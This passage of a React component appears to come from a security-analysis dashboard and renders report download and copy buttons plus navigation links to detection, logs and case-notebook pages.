              className="inline-flex items-center gap-1.5 rounded border border-primary/40 bg-primary/10 px-2.5 py-1.5 text-mono text-[10px] uppercase tracking-widest text-primary transition-all hover:bg-primary/20 hover:shadow-[0_0_12px_-2px_hsl(var(--primary)/0.45)]"
            >
              <Download className="h-3 w-3" /> Download Markdown Report
            </button>
            <button
              onClick={() => {
                const md = genMarkdownExport(sample, analysis!.score);
                navigator.clipboard.writeText(md);
              }}
              className="inline-flex items-center gap-1.5 rounded border border-border bg-card/60 px-2.5 py-1.5 text-mono text-[10px] uppercase tracking-widest text-muted-foreground transition-colors hover:border-primary/40 hover:text-foreground"
            >
              <Hash className="h-3 w-3" /> Copy Report
            </button>
          </div>
        </Panel>

        <SendToRow targets={[
          { label: "Detection & MITRE", to: "/detection", icon: ShieldAlert },
          { label: "Logs & Alerts", to: "/logs", icon: Database },
          { label: "Case Notebook", to: "/case", icon: ArrowRight },
        ]} />
      </div>
    </PageShell>
  );
}
